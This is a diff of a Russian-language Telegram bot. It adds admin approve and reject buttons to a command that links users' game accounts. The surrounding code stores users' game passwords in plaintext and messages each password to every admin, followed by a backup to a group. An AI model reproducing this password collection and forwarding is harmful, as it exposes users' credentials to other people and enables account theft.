@@ -10,6 +10,7 @@ import psutil
 from aiogram import BaseMiddleware, Bot, Dispatcher, types, F
 from aiogram.exceptions import TelegramRetryAfter
 from aiogram.filters import Command
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 
 # ==========================================
 # ВЕБ-СЕРВЕР ДЛЯ RENDER И UPTIMEROBOT
@@ -262,24 +263,68 @@ async def bind_handler(message: types.Message):
 
     db["accounts_db"][str_uid].append({"nick": username, "password": password})
     save_data()
-    await send_tracked_message(user_id, "[Бот] Аккаунт был успешно привязан.")
+    await send_tracked_message(user_id, "[Бот] Запрос отправлен на проверку администраторам.")
 
     tg_user = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
     admin_msg = (
-        f"[Уведомление] Новый привязанный аккаунт:\n\n"
+        f"[Уведомление] Новый запрос на привязку:\n\n"
         f"Игрок: {tg_user}\n"
         f"Telegram ID: {user_id}\n"
         f"Ник: {username}\n"
         f"Пароль: {password}"
     )
 
+    keyboard = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [InlineKeyboardButton(text="❌ Неверный пароль", callback_data=f"bind_wrong_pass:{user_id}:{username}")],
+            [InlineKeyboardButton(text="❓ Такого ника не существует", callback_data=f"bind_no_nick:{user_id}:{username}")],
+            [InlineKeyboardButton(text="✅ Привязка прошла успешно", callback_data=f"bind_success:{user_id}:{username}")]
+        ]
+    )
+
     for admin_id in db.get("admins", []):
         try:
-            await bot.send_message(chat_id=admin_id, text=admin_msg)
+            await bot.send_message(chat_id=admin_id, text=admin_msg, reply_markup=keyboard)
         except Exception as e:
             print(f"Не удалось отправить уведомление админу {admin_id}: {e}")
 
     await send_backup_to_group()
+@dp.callback_query(F.data.startswith("bind_"))
+async def process_bind_callback(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("У вас нет прав администратора!", show_alert=True)
+        return
+
+    data_parts = callback.data.split(":")
+    action = data_parts[0]
+    target_user_id = int(data_parts[1])
+    target_nick = data_parts[2]
+
+    str_uid = str(target_user_id)
+
+    if action == "bind_wrong_pass":
+        if str_uid in db["accounts_db"]:
+            db["accounts_db"][str_uid] = [acc for acc in db["accounts_db"][str_uid] if acc["nick"].lower() != target_nick.lower()]
+            save_data()
+        await send_tracked_message(target_user_id, f"[Бот] Отклонено: Неверный пароль для аккаунта {target_nick}.")
+        status_text = f"❌ Отклонено (Неверный пароль) администратором {callback.from_user.first_name}"
+
+    elif action == "bind_no_nick":
+        if str_uid in db["accounts_db"]:
+            db["accounts_db"][str_uid] = [acc for acc in db["accounts_db"][str_uid] if acc["nick"].lower() != target_nick.lower()]
+            save_data()
+        await send_tracked_message(target_user_id, f"[Бот] Отклонено: Такого ника ({target_nick}) не существует.")
+        status_text = f"❓ Отклонено (Ник не существует) администратором {callback.from_user.first_name}"
+
+    elif action == "bind_success":
+        await send_tracked_message(target_user_id, f"[Бот] Аккаунт {target_nick} успешно привязан!")
+        status_text = f"✅ Привязка прошла успешно (Подтвердил: {callback.from_user.first_name})"
+
+    await callback.message.edit_text(
+        f"{callback.message.text}\n\n-------------------\nСтатус: {status_text}",
+        reply_markup=None
+    )
+    await callback.answer("Статус обновлен и отправлен игроку!")
 
 @dp.message(Command("list"))
 async def list_handler(message: types.Message):
@@ -310,7 +355,8 @@ async def report_handler(message: types.Message):
         await send_tracked_message(message.chat.id, "[Система] Ваша жалоба отправлена.")
     except Exception:
         await send_tracked_message(message.chat.id, "[Система] Ошибка при отправке.")
-                               # ==========================================
+
+# ==========================================
 # АДМИН-КОМАНДЫ И ЗАПУСК
 # ==========================================
 @dp.message(Command("antispam"))
@@ -610,4 +656,6 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-    
+
+
+
